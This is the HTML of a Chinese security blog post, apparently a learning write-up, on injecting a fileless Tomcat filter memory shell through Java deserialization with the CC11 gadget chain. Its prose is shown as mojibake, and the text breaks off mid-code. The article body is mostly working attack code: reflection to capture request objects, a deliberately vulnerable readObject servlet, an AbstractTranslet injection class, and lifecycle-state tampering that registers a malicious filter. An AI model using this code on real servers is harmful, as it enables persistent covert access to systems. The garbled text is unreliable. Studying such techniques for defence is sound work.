<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Tomcatæ— æ–‡ä»¶å†…å­˜é©¬ | Reus09&#39;s Blog</title>
<meta name="keywords" content="å†…å­˜é©¬">
<meta name="description" content="å‰è¨€ ä¹‹å‰å­¦ä¹ äº†Tomcatçš„ç›¸å…³å†…å­˜é©¬ï¼Œé€šè¿‡jspæ–‡ä»¶ç®€å•å­¦ä¹ å®ç°äº†ä¸€ä¸‹ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰äº›ç‘•ç–µçš„ï¼Œå†…å­˜é©¬ç”Ÿæˆè¿‡ç¨‹ä¸­è¿˜æ˜¯æœ‰webshellæ–‡ä»¶è½åœ°">
<meta name="author" content="Reus09">
<link rel="canonical" href="/posts/tech/tomcat%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Tomcatæ— æ–‡ä»¶å†…å­˜é©¬" />
<meta property="og:description" content="å‰è¨€ ä¹‹å‰å­¦ä¹ äº†Tomcatçš„ç›¸å…³å†…å­˜é©¬ï¼Œé€šè¿‡jspæ–‡ä»¶ç®€å•å­¦ä¹ å®ç°äº†ä¸€ä¸‹ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰äº›ç‘•ç–µçš„ï¼Œå†…å­˜é©¬ç”Ÿæˆè¿‡ç¨‹ä¸­è¿˜æ˜¯æœ‰webshellæ–‡ä»¶è½åœ°" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/tech/tomcat%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-04-16T21:25:18+08:00" />
<meta property="article:modified_time" content="2023-04-16T21:25:18+08:00" /><meta property="og:site_name" content="(ã€ƒ&#39;â–½&#39;ã€ƒ)" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Tomcatæ— æ–‡ä»¶å†…å­˜é©¬"/>
<meta name="twitter:description" content="å‰è¨€ ä¹‹å‰å­¦ä¹ äº†Tomcatçš„ç›¸å…³å†…å­˜é©¬ï¼Œé€šè¿‡jspæ–‡ä»¶ç®€å•å­¦ä¹ å®ç°äº†ä¸€ä¸‹ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰äº›ç‘•ç–µçš„ï¼Œå†…å­˜é©¬ç”Ÿæˆè¿‡ç¨‹ä¸­è¿˜æ˜¯æœ‰webshellæ–‡ä»¶è½åœ°"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "ğŸ“šæ–‡ç« ",
      "item": "/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯",
      "item": "/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "Tomcatæ— æ–‡ä»¶å†…å­˜é©¬",
      "item": "/posts/tech/tomcat%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Tomcatæ— æ–‡ä»¶å†…å­˜é©¬",
  "name": "Tomcatæ— æ–‡ä»¶å†…å­˜é©¬",
  "description": "å‰è¨€ ä¹‹å‰å­¦ä¹ äº†Tomcatçš„ç›¸å…³å†…å­˜é©¬ï¼Œé€šè¿‡jspæ–‡ä»¶ç®€å•å­¦ä¹ å®ç°äº†ä¸€ä¸‹ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰äº›ç‘•ç–µçš„ï¼Œå†…å­˜é©¬ç”Ÿæˆè¿‡ç¨‹ä¸­è¿˜æ˜¯æœ‰webshellæ–‡ä»¶è½åœ°",
  "keywords": [
    "å†…å­˜é©¬"
  ],
  "articleBody": "å‰è¨€ ä¹‹å‰å­¦ä¹ äº†Tomcatçš„ç›¸å…³å†…å­˜é©¬ï¼Œé€šè¿‡jspæ–‡ä»¶ç®€å•å­¦ä¹ å®ç°äº†ä¸€ä¸‹ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰äº›ç‘•ç–µçš„ï¼Œå†…å­˜é©¬ç”Ÿæˆè¿‡ç¨‹ä¸­è¿˜æ˜¯æœ‰webshellæ–‡ä»¶è½åœ°çš„ã€‚\nç°åœ¨é€šè¿‡å¤©ä¸‹å¤§æœ¨å¤´,threedr3amå¸ˆå‚…çš„åšå®¢å­¦ä¹ ä¸€ä¸‹é€šè¿‡ååºåˆ—åŒ–å®ç°å†…å­˜é©¬çš„ç”Ÿæˆã€‚\nå›æ˜¾é—®é¢˜ jspä¸­å†…ç½®äº†requestå’Œresponseï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥è·å–åˆ°ï¼Œé€šè¿‡requestè·å–å‚æ•°ï¼Œresponseå†™æˆ‘ä»¬çš„å›æ˜¾å†…å®¹ã€‚\næˆ‘ä»¬è¦ç»“åˆååºåˆ—åŒ–æ‰“ï¼Œæ³¨å…¥çš„æ˜¯å­—èŠ‚ç ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡ä¸€äº›æ‰‹æ®µè·å–åˆ°requestå’Œresponseï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å›æ˜¾ã€‚\nè¿™é‡Œçœ‹ä¸€ä¸‹tomcatå¤„ç†httpè¯·æ±‚çš„å †æ ˆæƒ…å†µï¼Œå‘ç°requestå’Œresponseä¸€è·¯ä¼ é€’ï¼Œå¹¶ä¸”åœ¨å†…å­˜ä¸­éƒ½æ˜¯åŒä¸€ä¸ªå˜é‡ï¼Œä½†æ˜¯æ¯ä¸ªå‡½æ•°éƒ½æ˜¯é€šè¿‡ä¼ å‚çš„çš„æ–¹å¼è¿›è¡Œä¼ é€’requestå’Œresponseã€‚\nkingkk å¸ˆå‚…çš„æ€è·¯æ˜¯å¯»æ‰¾ä¸€ä¸ªé™æ€çš„å¯ä»¥å­˜å‚¨ request å’Œ response çš„å˜é‡ï¼Œå› ä¸ºå¦‚æœä¸æ˜¯é™æ€çš„è¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦è·å–åˆ°å¯¹åº”çš„å®ä¾‹ã€‚\næœ€ç»ˆkingkk å¸ˆå‚…åœ¨org.apache.catalina.core.ApplicationFilterChainè¿™ä¸ªç±»ä¸­ï¼Œæ‰¾åˆ°äº†ç¬¦åˆè¦æ±‚çš„å˜é‡ï¼Œè¿™é‡ŒlastServicedRequestå’ŒlastServicedResponseéƒ½æ˜¯é™æ€å˜é‡ï¼Œæ˜¯å…¨å±€çš„ã€‚\nçœ‹ä¸€ä¸‹lastServicedRequestå’ŒlastServicedResponseåœ¨å“ªäº›åœ°æ–¹å­˜åœ¨è°ƒç”¨ã€‚\né¦–å…ˆåœ¨org.apache.catalina.core.ApplicationFilterChainç±»ä¸­ï¼Œåœ¨é™æ€ä»£ç å—ä¼šè¿›è¡ŒlastServicedRequestå’ŒlastServicedResponseçš„åˆå§‹åŒ–ï¼Œå› ä¸ºApplicationDispatcher.WRAP_SAME_OBJECT é»˜è®¤ä¸º False ,æ ¹æ®é™æ€ä»£ç å—çš„æœ€ä¼˜å…ˆæ‰§è¡Œé¡ºåºï¼ŒlastServicedRequestå’ŒlastServicedResponseä¼šåˆå§‹åŒ–ä¸ºnull.\nç„¶ååœ¨ApplicationFilterChain#internalDoFilteræ–¹æ³•ä¸­ï¼Œåœ¨æ‰§è¡ŒServletçš„serviceæ–¹æ³•å‰ï¼Œå…ˆå¯¹ApplicationDispatcher.WRAP_SAME_OBJECT çš„å€¼è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœå€¼ä¸ºtrueï¼Œå°±å°†å½“å‰requestå’Œresponseåˆ†åˆ«å­˜æ”¾åˆ°lastServicedRequestå’ŒlastServicedResponseé‡Œé¢ã€‚ æœ€ååœ¨try-catch-finallyè¯­å¥ä¸­ï¼Œåœ¨ finally ä¸­åˆå°† lastServicedRequest å’Œ lastServicedResponse è®¾ä¸ºäº† nullã€‚\nå› æ­¤æ€è·¯å°±å¾ˆæ˜ç¡®ï¼Œé€šè¿‡åå°„ï¼Œä¿®æ”¹ApplicationDispatcher.WRAP_SAME_OBJECTçš„å€¼ä¸ºfalse,ç„¶ååå°„å¯¹lastServicedRequestå’ŒlastServicedResponseä¸¤ä¸ªé™æ€å˜é‡è¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™æ ·å½“ç¨‹åºæ‰§è¡Œåˆ°ApplicationFilterChain#internalDoFilter()æ–¹æ³•çš„æ—¶å€™ï¼Œå°±è·å–äº†requestå’Œresponseã€‚\nä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 public static void updateFinalField(Class aclass,String filedName){ try{ java.lang.reflect.Field field = aclass.getDeclaredField(filedName); // ä¿®æ”¹final å˜é‡çš„å€¼åå°„æµç¨‹ java.lang.reflect.Field modifiersField = field.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(field,field.getModifiers() \u0026 ~java.lang.reflect.Modifier.FINAL); field.setAccessible(true); // å¯¹äºWRAP_SAME_OBJECT,éœ€è¦è®¾ç½®å€¼ä¸ºtrue. if(filedName == \"WRAP_SAME_OBJECT\"){ if(!field.getBoolean(null)){ field.setBoolean(null,true); } }else{ // å¯¹äºlastServicedRequest å’Œ lastServicedResponse æˆ‘ä»¬éœ€è¦å°†å…¶åˆå§‹åŒ–ThreadLocal() if(field.get(null) == null){ field.set(null,new ThreadLocal()); } } }catch (Exception e){ e.printStackTrace(); } } static { try{ // ä¿®æ”¹WRAP_SAME_OBJECT å€¼ä¸º true String WRAP_SAME_OBJECT_NAME = \"WRAP_SAME_OBJECT\"; String lastServicedRequestName = \"lastServicedRequest\"; String lastServicedResponseName = \"lastServicedResponse\"; Class\u003c?\u003e applicationDispatcherClass = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); Class\u003c?\u003e applicationFilterChainClass = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); updateFinalField(applicationDispatcherClass,WRAP_SAME_OBJECT_NAME); updateFinalField(applicationFilterChainClass,lastServicedRequestName); updateFinalField(applicationFilterChainClass,lastServicedResponseName); }catch (Exception e){ e.printStackTrace(); } } å†…å­˜é©¬å®ç° å®ç°å†…å­˜é©¬çš„å¤§è‡´æ€è·¯ï¼š\n1ã€æˆ‘ä»¬é€šè¿‡åå°„å®ç°lastServicedRequestã€ lastServicedResponse åˆå§‹åŒ–å¹¶å­˜å‚¨requestå’Œresponseã€‚\n2ã€æ ¹æ®è·å¾—åˆ°çš„lastServicedRequestå’ŒlastServicedResponseè·å–requestå’Œresponseï¼Œç„¶ååˆ©ç”¨requestè·å–servletContextï¼Œç„¶ååŠ¨æ€æ³¨å†ŒFilterã€Servletã€Listernerç­‰ç»„ä»¶ã€‚\næˆ‘ä»¬è¿™é‡Œæ˜¯ç»“åˆCC11é“¾å®ç°ååºåˆ—åŒ–æ³¨å†ŒFilterå†…å­˜é©¬ï¼Œå…¶ä»–ç§ç±»å†…å­˜é©¬çš„å®ç°å¤§åŒå°å¼‚ã€‚\næ¼æ´ç¯å¢ƒ åˆ›å»ºä¸€ä¸ªServletï¼Œå­˜åœ¨ä¸€ä¸ªååºåˆ—åŒ–æ³¨å…¥ç‚¹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package servlet; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.InputStream; import java.io.ObjectInputStream; /** * @ClassName EvilServlet * @Description TODO * @Author reus09 * @Date 2023/4/16 21:39 * @Version 1.0 **/ @WebServlet(\"/evil\") public class EvilServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { InputStream inputStream = req.getInputStream(); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); try{ objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } resp.getWriter().write(\"Hello,Reus09!\"); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { InputStream inputStream = req.getInputStream(); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); try{ objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } resp.getWriter().write(\"Hello,Reus09!\"); } } åœ¨pom.xmlé‡Œé¢æ·»åŠ commons-collectionsä¾èµ–\n1 2 3 4 5 commons-collections commons-collections 3.1 ååºåˆ—åŒ–æ³¨å…¥ æ­¥éª¤ä¸€ æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªç»§æ‰¿äº†AbstractTransletï¼ˆå› ä¸ºéœ€è¦æºå¸¦æ¶æ„å­—èŠ‚ç åˆ°æœåŠ¡ç«¯åŠ è½½æ‰§è¡Œï¼‰çš„TomcatEchoInjectç±»ï¼Œåœ¨å…¶ä»£ç é‡Œé¢é€šè¿‡åå°„ä¿®æ”¹ApplicationDispatcher.WRAP_SAME_OBJECTä¸ºtrueï¼Œå¹¶ä¸”å¯¹lastServicedRequestå’ŒlastServicedResponseè¿™ä¸¤ä¸ªThreadLocalè¿›è¡Œåˆå§‹åŒ–ï¼Œä»£ç ä¸æˆ‘ä»¬åœ¨ å›æ˜¾é—®é¢˜ ç« èŠ‚çš„ä»£ç åŸºæœ¬ä¸€è‡´\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 package Evil; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.lang.reflect.Field; import java.util.logging.Filter; import java.util.logging.LogRecord; /** * @ClassName TomcatEchoInject * @Description TODO * @Author reus09 * @Date 2023/4/16 21:48 * @Version 1.0 **/ public class TomcatEchoInject extends AbstractTranslet{ public static void updateFinalField(Class aclass,String filedName){ try{ java.lang.reflect.Field field = aclass.getDeclaredField(filedName); java.lang.reflect.Field modifiersField = field.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(field,field.getModifiers() \u0026 ~java.lang.reflect.Modifier.FINAL); field.setAccessible(true); if(filedName == \"WRAP_SAME_OBJECT\"){ if(!field.getBoolean(null)){ field.setBoolean(null,true); } }else{ if(field.get(null) == null){ field.set(null,new ThreadLocal()); } } }catch (Exception e){ e.printStackTrace(); } } static { try{ // ä¿®æ”¹WRAP_SAME_OBJECT å€¼ä¸º true // ä¿®æ”¹final çš„å€¼ String WRAP_SAME_OBJECT_NAME = \"WRAP_SAME_OBJECT\"; String lastServicedRequestName = \"lastServicedRequest\"; String lastServicedResponseName = \"lastServicedResponse\"; Class\u003c?\u003e applicationDispatcherClass = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); Class\u003c?\u003e applicationFilterChainClass = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); updateFinalField(applicationDispatcherClass,WRAP_SAME_OBJECT_NAME); updateFinalField(applicationFilterChainClass,lastServicedRequestName); updateFinalField(applicationFilterChainClass,lastServicedResponseName); }catch (Exception e){ e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } æ­¥éª¤äºŒ å°† request å’Œ response è¿›è¡Œå–å‡ºï¼Œç„¶åæ³¨å…¥æˆ‘ä»¬çš„filterã€‚\nè·å¾—ServletContext é€šè¿‡åå°„è·å¾—lastServicedRequestå˜é‡ï¼Œå› ä¸ºå…¶å­˜å‚¨çš„ç±»å‹æ˜¯ServletRequestï¼Œå¯ä»¥é€šè¿‡getæ–¹æ³•è·å¾—requestï¼Œä¹‹åé€šè¿‡getServletContextæ–¹æ³•è·å¾—servletContext\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public static ServletContext getServletContext() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { ServletRequest servletRequest = null; /*shellæ³¨å…¥ï¼Œå‰æéœ€è¦èƒ½æ‹¿åˆ°requestã€responseç­‰*/ Class c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); java.lang.reflect.Field f = c.getDeclaredField(\"lastServicedRequest\"); f.setAccessible(true); ThreadLocal threadLocal = (ThreadLocal) f.get(null); //ä¸ä¸ºç©ºåˆ™æ„å‘³ç€ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–çš„å‡†å¤‡å·¥ä½œå·²æˆåŠŸ if (threadLocal != null \u0026\u0026 threadLocal.get() != null) { servletRequest = (ServletRequest) threadLocal.get(); } assert servletRequest != null; ServletContext servletContext = servletRequest.getServletContext(); if(servletContext != null){ return servletContext; }else{ return null; } } æ³¨å†ŒFilter å…¶å®è¿™é‡Œç›´æ¥æ ¹æ®æˆ‘ä»¬ä¹‹å‰åœ¨Tomcatå†…å­˜é©¬æ–‡ç« é‡Œé¢æåˆ°çš„æ³¨å†ŒFilterå†…å­˜é©¬çš„æ–¹æ³•ä¸€æ ·ï¼Œç›´æ¥åˆå§‹åŒ–æ·»åŠ FilterDefã€ç„¶åé€šè¿‡StandarContextè·å–FilterConfigsã€æ‰‹åŠ¨æ„é€ FilterConfig,FilterMap,æœ€åä¸€ä¸€æ·»åŠ å³å¯ã€‚\nè¿™é‡Œæ ¹æ®å¤§å¸ˆå‚…çš„åšå®¢ï¼Œå­¦ä¹ ä¸€ä¸‹å¦ä¸€æ¡æ³¨å†ŒFilterçš„è·¯çº¿ï¼Œå…¶å®åŸç†éƒ½æ˜¯å¤§åŒå°å¼‚ã€‚\nServletContext æä¾›äº†addFilteræ–¹æ³•ï¼Œä¸‰ä¸ªé‡è½½æ–¹æ³•ï¼Œåˆ†åˆ«æ¥æ”¶å­—ç¬¦ä¸²ç±»å‹çš„ filterName ä»¥åŠ Filter å¯¹è±¡/className å­—ç¬¦ä¸²/Filter å­ç±»çš„ Class å¯¹è±¡ï¼Œæä¾›ä¸åŒåœºæ™¯ä¸‹æ·»åŠ  filter çš„åŠŸèƒ½ï¼Œè¿™äº›æ–¹æ³•å‡è¿”å› FilterRegistration.Dynamic å®é™…ä¸Šå°±æ˜¯ FilterRegistration å¯¹è±¡ï¼Œä¸‰ç§é‡è½½æ–¹æ³•å®é™…ä¸Šéƒ½æ˜¯è°ƒç”¨org.apache.catalina.core.ApplicationContext#addFilter(java.lang.String, java.lang.String, javax.servlet.Filter)æ–¹æ³•\nè¿™ä¸ªæ–¹æ³•åˆ›å»ºäº†ä¸€ä¸ª FilterDef å¯¹è±¡ï¼Œå°† filterNameã€filterClassã€filter å¯¹è±¡åˆå§‹åŒ–è¿›å»ï¼Œä½¿ç”¨ StandardContext çš„ addFilterDef æ–¹æ³•å°†åˆ›å»ºçš„ FilterDef å‚¨å­˜åœ¨äº† StandardContext ä¸­çš„ä¸€ä¸ª Hashmap filterDefs ä¸­ï¼Œç„¶å new äº†ä¸€ä¸ª ApplicationFilterRegistration å¯¹è±¡å¹¶ä¸”è¿”å›ã€‚\nä½†æ˜¯è¿™ä¸ªæ–¹æ³•æ·»åŠ è‡ªå®šä¹‰Filteræœ‰ä¸¤ä¸ªé—®é¢˜ï¼š\n1ã€å¹¶ä¸”context.getState()åœ¨è¿è¡Œæ—¶è¿”å›çš„stateå·²ç»æ˜¯LifecycleState.STARTEDè¡¨ç¤ºç¨‹åºåœ¨è¿è¡Œä¸­ï¼Œå› æ­¤å¦‚æœç›´æ¥æ·»åŠ çš„è¯ï¼Œç¨‹åºä¼šç›´æ¥æŠ›å‡ºé”™è¯¯ï¼šapplicationContext.addFilter.ise.\n2ã€Filterå†…å­˜é©¬çš„ä¼ é€’æ˜¯é€šè¿‡FilterChainï¼ŒaddFilteræ–¹æ³•å¹¶æ²¡æœ‰å°†æ·»åŠ çš„Filteræ”¾åˆ°FilterChainé“¾ä¸­ï¼Œå› æ­¤å•çº¯è°ƒç”¨è¿™ä¸ªæ–¹æ³•å¹¶ä¸ä¼šå®ç°è‡ªå®šä¹‰çš„Filteræ³¨å†Œã€‚\né—®é¢˜ä¸€ å¯¹äºé—®é¢˜ä¸€ï¼Œæœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆ\næ–¹æ³•ä¸€ï¼š\næˆ‘ä»¬ç›´æ¥ä¸è€ƒè™‘ä½¿ç”¨org.apache.catalina.core.ApplicationContext#addFilter()è¿™ä¸ªæ–¹æ³•ï¼Œå› ä¸ºå®é™…ä¸Šè¯¥æ–¹æ³•æ˜¯é€šè¿‡standardContext.addFilterDef()æ¥å®ç°æ·»åŠ filterDef,å› æ­¤æˆ‘ä»¬é€šè¿‡åå°„æ„é€ filterDefï¼Œç„¶åå°è£…ä¸ºä¸€ä¸ªApplicationFilterRegistrationå¯¹è±¡å³å¯ã€‚ å®ç°æ–¹æ³•å’Œä¹‹å‰tomcatå†…å­˜é©¬å­¦åˆ°çš„å·®ä¸å¤šï¼Œå°±ä¸å†èµ˜è¿°ã€‚ æ–¹æ³•äºŒï¼š\næˆ‘ä»¬é€šè¿‡åå°„ä¿®æ”¹contextå­—æ®µçš„stateï¼Œåœ¨æ·»åŠ filterå‰ï¼Œé€šè¿‡åå°„è®¾ç½®æˆLifecycleState.STARTING_PREPï¼Œåœ¨å…¶é¡ºåˆ©æ·»åŠ å®Œæˆåï¼Œå†æŠŠå…¶æ¢å¤æˆLifecycleState.STARTEï¼Œè¿™é‡Œå¿…é¡»è¦æ¢å¤ï¼Œè¦ä¸ç„¶ä¼šé€ æˆæœåŠ¡ä¸å¯ç”¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 //ä¿®æ”¹çŠ¶æ€ï¼Œè¦ä¸ç„¶è°ƒç”¨addFilteræ–¹æ³•æ²¡æœ‰æ•ˆæœ java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class .getDeclaredField(\"state\"); stateField.setAccessible(true); stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP); xxxxxxx // æ¢å¤çŠ¶æ€ï¼Œä½¿æœåŠ¡æ­£å¸¸ä½¿ç”¨ if(stateField != null){ stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); } é—®é¢˜äºŒ åœ¨å®é™…æ‰§è¡Œæ ˆä¸­ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå®é™…filterçš„åˆ›å»ºæ˜¯åœ¨org.apache.catalina.core.StandardWrapperValve#invokeæ‰§è¡ŒApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);çš„åœ°æ–¹ã€‚\nåœ¨createFilterchainæ–¹æ³•ä¸­å…ˆé€šè¿‡wrapper.getParent()è·å¾—å½“å‰çš„StandardContextï¼Œç„¶åä»contextä¸­è·å–FilterMaps\næ¥ç€createChainæ–¹æ³•ä¼šéå† FilterMaps ä¸­çš„ FilterMapï¼Œå¦‚æœå‘ç°ç¬¦åˆå½“å‰è¯·æ±‚ url ä¸ FilterMap ä¸­çš„ urlPattern ç›¸åŒ¹é…ï¼Œå°±ä¼šè¿›å…¥ if åˆ¤æ–­ï¼Œè°ƒç”¨ findFilterConfig æ–¹æ³•åœ¨ filterConfigs ä¸­å¯»æ‰¾å¯¹åº” filterNameåç§°çš„ FilterConfigï¼Œç„¶åå¦‚æœä¸ä¸ºnullï¼Œå°±è¿›å…¥ if åˆ¤æ–­ï¼Œå°† filterConfig æ·»åŠ åˆ° filterChainä¸­ã€‚\nä¸Šè¿°å¦‚æœè·å–åˆ°çš„filterConfigä¸ä¸ºnullçš„è¯ï¼Œå°±è°ƒç”¨org.apache.catalina.core.ApplicationFilterChain#addFilteræ–¹æ³•å°†å½“å‰Filteræ·»åŠ åˆ°FilterChainä¸Šé¢ã€‚\né¦–å…ˆä¼šéå†filtersï¼Œåˆ¤æ–­æˆ‘ä»¬çš„filteræ˜¯å¦å·²ç»å­˜åœ¨ï¼ˆå…¶å®å°±æ˜¯å»é‡ï¼‰ï¼Œæ¥ä¸‹æ¥çš„ if åˆ¤æ–­å°±æ˜¯æ‰©å®¹ï¼Œå¦‚æœ n å·²ç»ç­‰äºå½“å‰ filters çš„é•¿åº¦äº†å°±å†æ·»åŠ 10ä¸ªå®¹é‡ï¼Œæœ€åå°†æˆ‘ä»¬çš„filterConfig æ·»åŠ åˆ° filtersä¸­ã€‚\nè‡³æ­¤ filterChain ç»„è£…å®Œæ¯•ã€‚\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒcreateFilterChainæ–¹æ³•ä»standardContextä¸­æå–äº†FilterMapsæ•°ç»„ï¼Œç„¶åéå†FilterMapsï¼Œå¯¹æ¯ä¸ªFilterMapå¯¹åº”çš„FilterNameä»standardContextä¸­è·å–å¯¹åº”çš„FilterConfigï¼Œæœ€åå°†è¯¥filterConfigæ·»åŠ åˆ°filterChainä¸­ã€‚\nå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨FilterMapså’ŒFilterConfigsä¸­æ³¨å†Œå°è£…æˆ‘ä»¬è‡ªå®šä¹‰çš„Filterç›¸å…³ä¿¡æ¯çš„FilterMapå’ŒFilterConfigã€‚\næ³¨å†ŒFilterMap:\næˆ‘ä»¬ä¹‹å‰é€šè¿‡org.apache.catalina.core.ApplicationContext#addFilter()æ–¹æ³•å¾—åˆ°çš„FilterRegistrationå¯¹è±¡å¯ä»¥è°ƒç”¨org.apache.catalina.core.ApplicationFilterRegistration#addMappingForUrlPatternsæ–¹æ³•ï¼Œå®ç°å°†filterMapæ’å…¥åˆ°standardContextçš„filterMapsä¸­ã€‚\nå› æ­¤æ³¨å†ŒFilterDefå’ŒFilterMapçš„å®Œæ•´æ“ä½œä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //ä¿®æ”¹çŠ¶æ€ï¼Œè¦ä¸ç„¶è°ƒç”¨addFilteræ–¹æ³•æ²¡æœ‰æ•ˆæœ java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class .getDeclaredField(\"state\"); stateField.setAccessible(true); stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP); //åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„Filteré©¬ Filter filter = new TomcatShellInject(); // è°ƒç”¨addFilter æ–¹æ³•æ·»åŠ  javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(FILTER_NAME,filter); // è¿›è¡Œä¸€äº›ç®€å•çš„è®¾ç½® filterRegistration.setInitParameter(\"encoding\", \"utf-8\"); filterRegistration.setAsyncSupported(false); // è®¾ç½®åŸºæœ¬çš„url pattern, 